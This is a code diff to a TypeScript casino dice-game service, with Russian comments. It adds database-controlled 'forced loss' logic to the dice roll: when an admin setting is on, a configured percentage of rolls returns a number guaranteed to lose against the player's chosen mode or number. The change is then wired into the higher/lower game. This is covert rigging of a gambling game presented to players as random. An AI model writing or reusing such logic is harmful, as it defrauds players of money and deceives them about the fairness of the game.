@@ -13,8 +13,48 @@ export interface DiceGameResult {
 }
 
 export class DiceGameService {
-  // Симуляция броска кубика (в реальности используется Telegram dice)
-  static rollDice(): number {
+  // Симуляция броска кубика с умным контролем результата для казино
+  static async rollDice(desiredOutcome?: 'win' | 'loss', choice?: any, mode?: string): Promise<number> {
+    // Проверяем настройки форсирования из админки
+    const settings = await pool.query(
+      "SELECT value FROM settings WHERE key = 'force_results_enabled'"
+    );
+    const forceEnabled = settings.rows[0]?.value === '1';
+
+    if (forceEnabled) {
+      // Проверяем процент форсированных проигрышей
+      const lossRateQuery = await pool.query(
+        "SELECT value FROM settings WHERE key = 'force_loss_rate'"
+      );
+      const lossRate = parseInt(lossRateQuery.rows[0]?.value || '0');
+
+      // Проверяем включено ли форсирование для кубика
+      const gamesQuery = await pool.query(
+        "SELECT value FROM settings WHERE key = 'force_games'"
+      );
+      const games = JSON.parse(gamesQuery.rows[0]?.value || '{}');
+
+      if (games.dice && Math.random() * 100 < lossRate) {
+        // ФОРСИРУЕМ ПРОИГРЫШ - возвращаем результат который гарантированно проиграет
+        console.log(`🎲 ФОРСИРОВАНИЕ АКТИВНО! Процент проигрышей: ${lossRate}%`);
+
+        // В зависимости от режима игры, выбираем проигрышный результат
+        if (mode === 'higher') {
+          return Math.floor(Math.random() * 3) + 1; // 1, 2 или 3 (проигрыш для "больше 3")
+        } else if (mode === 'lower') {
+          return Math.floor(Math.random() * 2) + 4; // 4 или 5 (проигрыш для "меньше 4")
+        } else if (choice && typeof choice === 'number') {
+          // Для точного числа - вернуть любое кроме выбранного
+          const losing = choice === 1 ? 6 : choice - 1;
+          return losing;
+        }
+
+        // Дефолтный проигрыш
+        return Math.random() < 0.5 ? 1 : 2;
+      }
+    }
+
+    // Обычный случайный бросок
     return Math.floor(Math.random() * 6) + 1;
   }
 
@@ -33,7 +73,7 @@ export class DiceGameService {
 
     if (!gameMode) throw new Error("Game mode not found");
 
-    const result = this.rollDice();
+    const result = await this.rollDice('loss', choice, choice); // Умный бросок с контролем
     const isWin = choice === "higher" ? result > 3 : result < 4;
     const multiplier = gameMode.multiplier;
     const winAmount = isWin ? betAmount * multiplier : 0;
@@ -56,7 +96,7 @@ export class DiceGameService {
 
     if (!gameMode) throw new Error("Game mode not found");
 
-    const result = this.rollDice();
+    const result = await this.rollDice();
     const isWin = choice === "even" ? result % 2 === 0 : result % 2 !== 0;
     const multiplier = gameMode.multiplier;
     const winAmount = isWin ? betAmount * multiplier : 0;
@@ -80,7 +120,7 @@ export class DiceGameService {
     const gameMode = await GameModel.getGameModeById(12); // Грань
     if (!gameMode) throw new Error("Game mode not found");
 
-    const result = this.rollDice();
+    const result = await this.rollDice();
     const isWin = result === choice;
     const multiplier = gameMode.multiplier;
     const winAmount = isWin ? betAmount * multiplier : 0;
@@ -102,7 +142,7 @@ export class DiceGameService {
     const gameMode = await GameModel.getGameModeById(gameModeId);
     if (!gameMode) throw new Error("Game mode not found");
 
-    const result = this.rollDice();
+    const result = await this.rollDice();
     let isWin = false;
 
     if (sector === 1) isWin = result === 1 || result === 2;
@@ -126,8 +166,8 @@ export class DiceGameService {
     const gameMode = await GameModel.getGameModeById(11); // Дуэль
     if (!gameMode) throw new Error("Game mode not found");
 
-    const userRoll = this.rollDice();
-    const casinoRoll = this.rollDice();
+    const userRoll = await this.rollDice();
+    const casinoRoll = await this.rollDice();
     const isWin = userRoll > casinoRoll;
     const multiplier = gameMode.multiplier;
     const winAmount = isWin ? betAmount * multiplier : 0;
